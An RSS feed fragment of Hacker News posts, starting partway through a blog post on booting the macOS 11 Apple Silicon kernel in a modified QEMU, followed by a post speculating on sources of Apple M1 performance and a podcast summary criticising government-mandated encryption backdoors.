  -kernel /path/to/bootcache-arm64e \
  -dtb /path/to/DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb  \
  -monitor stdio -m 6G -s -S -d unimp,mmu \
  -serial file:/dev/stdout -serial file:/dev/stdout -serial file:/dev/stdout \
  -append "-noprogress cs_enforcement_disable=1 amfi_get_out_of_my_way=1 nvram-log=1 debug=0x8 kextlog=0xffff io=0xfff serial=0x7 cpus=1 rd=md0 apcie=0xffffffff" \
  -initrd /path/to/ios14.0b3/ramdisk.dmg $@
</code></pre></div>    </div>
  </li>
  <li>run gdb with <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/bootit.gdbscript">this script</a>:
    <div><div><pre><code>~/Library/Android/sdk/ndk/21.0.6113669/prebuilt/darwin-x86_64/bin/gdb \
-D /any/emptydir \
-x bootit.gdbscript
</code></pre></div>    </div>
    
  </li>
</ul>

<p>And the macOS kernel will <a href="https://gist.github.com/zhuowei/5aa668e76f387374cd56848313aa2197">boot into launchd</a>.</p>

<h2 id="is-this-useful">Is this useful?</h2>

<p><img src="https://worthdoingbadly.com/assets/blog/xnuqemu3/wwdc2018_no.jpg" alt="&quot;No.&quot; - Craig Federighi, WWDC 2018"></p>

<p>No:</p>

<ul>
  <li>Absolutely nothing is supported: literally only the kernel and the serial port works, not even the userspace since there’s no disk driver</li>
  <li>Userspace is instead borrowed from iOS 14 b3</li>
  <li>This will never boot anything close to graphical macOS UI</li>
  <li>Most importantly, even if I ever managed to fully boot the macOS kernel, emulating macOS is useless anyways.</li>
</ul>

<p>There are only three reasons I can think of for emulating macOS: security research, software development without a real Apple Silicon machine, and Hackintoshing. This approach will help with none of these:</p>

<ul>
  <li>Emulating iOS is useful for security research when jailbreak is not available. Apple Silicon Macs already support kernel debugging.</li>
  <li>Not useful for software dev: QEMU’s CPU emulation doesn’t support Apple Silicon-specific features, such as Rosetta’s memory ordering or the APRR JIT.</li>
  <li>as for Hackintosh: macOS uses CPU instructions that aren’t available yet on non-Apple ARM CPUs, so you can’t have hardware accelerated virtualization, only very slow emulation. Besides, Hackintoshes are often built when Apple’s own hardware isn’t fast enough; in this case, Apple’s ARM processors are already some of the fastest in the industry.</li>
</ul>

<p>I researched this this not because it’ll be practical, but only to understand how an Apple Silicon Mac works. This will never be a <a href="https://www.youtube.com/watch?v=1AtE54HpXBM">Time Train</a>: only a <a href="https://youtu.be/UswpJh6Zvd8?t=119">science experiment</a>.</p>

<h2 id="what-i-did">What I did</h2>

<h2 id="create-kext-collection">Create kext collection</h2>

<p>On iOS, the kernel and its Kexts are packed together into a bootable file called the <strong>Kernel Cache</strong>.</p>

<p>macOS 11 uses an evolved version of this format, called the <strong>Boot Kext Collection</strong>.</p>

<p>Like the iOS kernelcache, it contains all Kexts required for booting, so the bootloader only needs to load it into memory and jump into it.</p>

<p>To create a boot kext collection, macOS 11 introduces the <a href="https://developer.apple.com/documentation/kernel/installing_a_custom_kernel_extension?language=objc"><code>kmutil</code></a> tool.</p>

<p>Here’s <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh">my script</a> to get <code>kmutil</code> to generate an arm64e kext collection.</p>

<p>It manually excludes some kexts because they cause kmutil to error out. Most are because they depend on ACPI, which is not available on Apple Silicon. I made a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/printexcludekexts.sh">script</a> to detect them.</p>

<p>Debugging <code>kmutil</code> failures on macOS 11 beta 3 was easy because it dumped out the entire NSError message. However, on macOS 11.0.1 beta, Apple decided to hide the full error message and only print an error code. I had to disable SIP and put a breakpoint on <code>swift_errorRetain</code> to get at the underlying error.</p>

<p>Once the <code>build_arm64e_kcache.sh</code> runs, a Boot Kext Collection is created at <code>~/kcache_out/bootcache-arm64e</code>, which can be booted in QEMU.</p>

<h2 id="disassembling-the-boot-kext-collection">Disassembling the boot kext collection</h2>

<p>For debugging, I also had to disassemble the newly created Boot Kext Collection in Ghidra.</p>

<p>Unfortunately, Ghidra isn’t updated for macOS 11 and will refuse to load the file, first giving an error about XML DOCTYPE, then - once that’s worked around - an <a href="https://github.com/NationalSecurityAgency/ghidra/issues/2192">IOException</a> from the invalid <code>ntools</code> value in the <code>LC_BUILD_VERSION</code> load command.</p>

<p>I created a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/patch_boot_kext_collection_for_ghidra.py">script</a> to fix up the kext collection so that Ghidra can load it.</p>

<p>Note that this is still not perfect - Ghidra still doesn’t fixup pointers or read symbols.</p>

<p>To get method names, I also disassembled the raw kernel file (<code>/System/Library/Kernels/kernel.release.t8020</code>) for cross reference. Note that the raw kernel is based at a different address - you can either rebase it in Ghidra, or just be careful to convert addresses.</p>

<h2 id="disable-pac">Disable PAC</h2>

<p>I already had a <a href="https://worthdoingbadly.com/xnuqemu2/">modified QEMU to boot an iOS kernel</a> (which has inspired others, such as <a href="https://alephsecurity.com/">Aleph Security</a>, to build much better open-source iOS emulation platforms)</p>

<p>In early 2019 I updated my modified QEMU to work with PAC for the iPhone Xs/Xr.</p>

<p>QEMU by that time already supported PAC instructions; however, Apple <a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">modified</a> the crypto algorithm when implementing PAC, so the kernel fails to boot.</p>

<p>I decided to instead <a href="https://github.com/zhuowei/qemu/commit/16613b67ad15a902791109077ebfb1091f1873aa">turn PAC instructions</a> into no-ops, since I don’t know how Apple’s algorithm worked. This also makes it easier to debug the kernel.</p>

<p>Since the macOS DTK used an A12z processor, the modified QEMU just worked.</p>

<h2 id="device-tree">Device tree</h2>

<p>Like iOS, macOS on Apple Silicon uses a <strong>device tree</strong> to describe hardware to the kernel, and to pass boot arguments.</p>

<p>macOS 11.0.1 beta’s installer doesn’t contain a device tree for the DTK: I suspect it would be in the .ipsw files, which are not publically available. Instead, I borrowed the iPad Pro’s device tree from iOS 14 beta 3.</p>

<p>Like the <a href="https://worthdoingbadly.com/xnuqemu2/">iOS in QEMU experiments</a>, I first disabled every piece of hardware in the device tree except the serial port.</p>

<p>Unlike iOS, macOS expects some more information in the device tree:</p>
<ul>
  <li>ram size (since Macs have upgradeable RAM)</li>
  <li>nvram, otherwise panics with a null pointer while reading nonce-seed. (I copied nvram from <a href="https://gist.github.com/bazad/1faef1a6fe396b820a43170b43e38be1">bazad’s dump of an iPhone device tree</a>.)</li>
  <li>AMCC (KTRR) register positions</li>
  <li>System Integrity Protection status</li>
</ul>

<p>I rewrote my <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">device tree editor</a> to allow populating these extra params.</p>

<h2 id="up-to-launchd">Up to launchd</h2>

<p>I can’t actually boot a macOS root filesystem as I don’t have an emulated hard disk.</p>

<p>I don’t have a recovery ramdisk either: that would likely only be included in the DTK IPSW, which is not public.</p>

<p>Instead, I decided to boot with an iOS ramdisk to test the kernel, and disable signature checking using a GDB breakpoint.</p>

<p>I also couldn’t get the trustcache (list of executables trusted by the kernel) to load. I tried following <a href="https://alephsecurity.com/2019/06/25/xnu-qemu-arm64-2/">Aleph Security’s guide</a>, but macOS 11 is more strict than iOS 12 and needs it below the kernel; I couldn’t figure out the correct memory address.</p>

<h2 id="why-it-took-so-long">Why it took so long</h2>

<p>I actually had this blog post ready since <a href="https://gist.github.com/zhuowei/27816d39f234468cf2956479c0dea7ad">August 9th</a>, but I spent an extra 3 months trying to fix issues, since I really wanted to at least get to a shell!</p>

<p>Unfortunately:</p>
<ul>
  <li>debugging why drivers wasn’t loading was hard</li>
  <li>I couldn’t disable signature checking properly</li>
  <li>I wanted to wait until Apple released an A14 kernel instead of the DTK’s A12, so that we can look at how virtualization works, but they never did</li>
</ul>

<p>It’s now November 9th and Apple’s holding their press conference tomorrow: so it’s <a href="https://www.youtube.com/watch?v=9tAbhrDUrqM">now or never</a>.</p>

<h2 id="whats-left">What’s left</h2>

<p>I’m probably not going to be working further on this, but here’s what one can do to make this an actual useful research platform:</p>

<ul>
  <li>Figure out why half the drivers aren’t loading at all</li>
  <li>Write basic drivers/emulations:
    <ul>
      <li>probably emulate AIC in QEMU (based on Project Sandcastle’s Linux driver) since a custom interrupt controller Kext would be hard to write</li>
      <li>port Apple’s old <a href="https://opensource.apple.com/source/AppleMacRiscPCI/AppleMacRiscPCI-3.4/AppleMacRiscPCI.cpp.auto.html">PowerPC PCIE</a> drivers, since it’s too hard to emulate the Apple Silicon PCIE controller. This will allow us to connect a virtual hard drive.</li>
    </ul>
  </li>
  <li>Switch to the A14 kernel when Apple releases Apple Silicon Macs, so we can test virtualization</li>
</ul>

<h2 id="what-i-learned">What I learned</h2>

<ul>
  <li>How to modify QEMU to disable PAC</li>
  <li>How iBoot on Apple Silicon passes boot options in the device tree</li>
  <li>How to generate an Apple Silicon kernel cache without an Apple Silicon Mac</li>
  <li>How to fight <code>kmutil</code> for the real error message</li>
  <li>Never procrastinate on a blog post for three months</li>
</ul>

  </div>
</article>

      </div>
      
    </div></div>]]>
            </description>
            <link>https://worthdoingbadly.com/xnuqemu3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064593</guid>
            <pubDate>Thu, 12 Nov 2020 00:09:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overlooked source of Apple M1 performance]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064570">thread link</a>) | @kwiromeo
<br/>
November 11, 2020 | https://kwiromeo.com/explaining-apple-m1-products-performance/ | <a href="https://web.archive.org/web/*/https://kwiromeo.com/explaining-apple-m1-products-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>When watching <a href="https://youtu.be/5AwdkGKmZ0I">Apple's Arm laptops</a> event, I couldn't help but wonder: where is all that performance coming from? During the event, there were two key points (that are not obvious, IMHO), that further explain where they are getting all that extra performance from.</p><p>But first, let's mention the obvious stuff, that plenty of analysts will anchor on, and that are valid:</p><ul><li><strong>More transistors is better</strong>: 5nm process allows more transistors in a chip. More transistors = more instructions processed = faster performance</li><li><strong>Small means low power consumption:</strong> 5nm process allows for lower power consumption. This is because, at that size, the transistor can operate between 0.7V - 1.2V per transistor[<a href="https://www.anandtech.com/show/15219/early-tsmc-5nm-test-chip-yields-80-hvm-coming-in-h1-2020">1</a>] (instead of 1V - 1.35V)[<a href="https://www.anandtech.com/show/16107/what-products-use-intel-10nm-superfin-demystified">2</a>]. At the numbers of billions of transistors, a small voltage difference means a lot for battery consumption.</li><li><strong>Specialized hardware gives an edge</strong>: Accelerators (like the neural engine) allow the Mac to offload specific tasks to another core, which leaves the main processor, M1 to do the work that is less specific (like compiling your code from XCode 😉 )</li></ul><h2 id="unified-memory-architecture-or-making-friends-with-physics-">Unified Memory Architecture (or Making Friends with Physics)</h2><p>When I was transitions careers to become a software developer, I came across this post about latency numbers of common computer components ( a link at <a href="http://norvig.com/21-days.html#answers">Peter Norvig post about it</a>), it occurred to me that all these numbers were proportional to the distance between the CPU and the location of the data. The further the electrons need to travel, the more time they will take. This is a massive oversimplification but illustrates the point well. There are other details to take into account as well. &nbsp;The one that comes to mind is that having the electrical signal only traveling though the SoC instead of the printed circuit board, avoid a lot of signal conditioning that would need to happen to keep signal integrity. Apple brought all their chips closer, which reduced the amount of travel time for every critical signal, as well as reduced the number of medium transitions (from an integrated circuit to a printed circuit board, back to an integrated circuit) as shown in the figure below. This results in higher data access speed by the CPU and the GPU, which translates to a faster experience for the end-user.</p><figure><img src="https://kwiromeo.com/content/images/2020/11/apple_m1_soc_vs_logic_board.jpg" alt="sketch of a logic board with separate chips compared to an apple M1 SoC"><figcaption>Showing the reduced distance of signal traveling for a logic board vs. a SoC :-)&nbsp;</figcaption></figure><h2 id="avoid-unnecessary-copies-or-the-gospel-by-a-c-performance-engineer-">Avoid Unnecessary Copies (or the gospel by a C++ performance engineer)</h2><p>In my year of learning and using C++, I've learned that (unnecessary) copies are bad, and Craig Federighi also knows this. During the presentation, he says</p><blockquote>"We built macOS on Apple Silicon to use the same data formats for things like video decode, GPU and display, so there's no need for expensive copying or translation"</blockquote><p>Why are copies they bad? This has to do with what happens when an object is copied. Here's a simple way to look at the process. Whenever a program issues a copy command, then the CPU needs to:</p><ul><li>read the memory location of the data,</li><li>then reserve memory where the data will be copied</li><li>then copy the data</li><li>then decide what to do with the original data</li></ul><p>When the source of the data copied remains, then the CPU is done. However, when the source data needs to be deleted, then there's the additional step of de-allocating memory space so that other instructions can use it. This problem is sometimes caught by the compiler, whenever possible, and performs an optimization called <a href="https://en.wikipedia.org/wiki/Copy_elision">copy elision</a> whenever it is obvious that a copy is unnecessary. However, while <a href="https://youtu.be/bSkpMdDe4g4">compilers are awesome</a>, they can't undo a programmer's lack of optimization knowledge. One solution that the C++ community found useful, is that we can help the compiler by specifying when copies are not needed. Since C++ 14, programmers can also tell the compilers that we don't need to go through a deep copy, instead, use a command <code>std::move</code>, which does the magic of not destroying and recreate the same thing. This saves CPU cycles, and improves performance.</p><p>From the Apple M1 MacBook presentation, Apple makes the above behavior default: <strong>instead of having the programmer choose between copying or reusing data, reuse of the data is the default</strong>. This makes the efficient behavior to be the default, and save programs from being slowed down by unnecessary copies</p><h2 id="things-i-may-have-missed-and-things-i-don-t-know-about-">Things I May Have Missed (and Things I Don't Know About)</h2><p>The above is a simplified view of the programming model of Apple's new M1 chip. By not having programmed for one, the above is my best guess at how the items noted in the keynote mentions would translate in hardware and software. It's possible that Apple simplified the programming paradigm of CPU vs GPU programming by obfuscating calls to GPU instructions in the macOS APIs. If all the hardware is one the same chip, the programmer doesn't need to know what sub-chip (CPU, GPU, Neural Engine, etc...) is doing the job, but just that the chip (M1) is doing it. From there, the job is for compiler optimization to take over, and make the best decision as to which sub-chip needs to process the instruction.</p><p>—</p><p>PS: if someone who knows the nitty gritty details of this, hit me up <a href="https://twitter.com/kwiromeo">@kwiromeo</a> on twitter. I would love to learn more about this.</p><hr><p>[1] AnandTech - <a href="https://www.anandtech.com/show/15219/early-tsmc-5nm-test-chip-yields-80-hvm-coming-in-h1-2020">Early TSMC 5nm Test Chip Yields 80%, HVM Coming in H1 2020</a></p><p>[2] AnandTech - <a href="https://www.anandtech.com/show/16107/what-products-use-intel-10nm-superfin-demystified">What Products Use Intel 10nm? SuperFin and 10++ Demystified</a></p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://kwiromeo.com/explaining-apple-m1-products-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064570</guid>
            <pubDate>Thu, 12 Nov 2020 00:06:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Government Mandated Backdoors – Security Explained]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064542">thread link</a>) | @sec-explained
<br/>
November 11, 2020 | http://securityexplained.fm/1245467/6099736-government-mandated-backdoors | <a href="https://web.archive.org/web/*/http://securityexplained.fm/1245467/6099736-government-mandated-backdoors">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <p>Security Explained</p>
      <p>Government Mandated Backdoors</p>
      <p><span>Nov 11, 2020</span>
        <span>Season 1</span>
        <span>Episode 6</span>
      </p>
      <p>Chris Grayson, Drew Porter, Logan Lamb</p>
      <div>
        <div><p>The Department of Justice has recently released a new memo entitled "International Statement: End-To-End Encryption and Public Safety," and while it says a lot about helping trafficked kids and combating other crime, the memo outlines proposals that will do nothing of the sort. In this episode we discuss the content of this memo and the eerily similar-sounding EARN IT act, pick apart which parts of both are valid and which aren't, and talk about the real motivations behind these documents. We cover the current processes for gaining lawful access to data and how these new proposals don't amount to any true improvement upon existing capabilities.</p><p>As has been the standard theme for the past two decades, American privacy is under attack. These new positions reflect a stark step in the wrong direction if you care to preserve human privacy.</p></div>
      </div>
    </div>
  </div></div>]]>
            </description>
            <link>http://securityexplained.fm/1245467/6099736-government-mandated-backdoors</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064542</guid>
            <pubDate>Thu, 12 Nov 2020 00:00:30 GMT</pubDate>
        </item>
    </channel>
</rss>
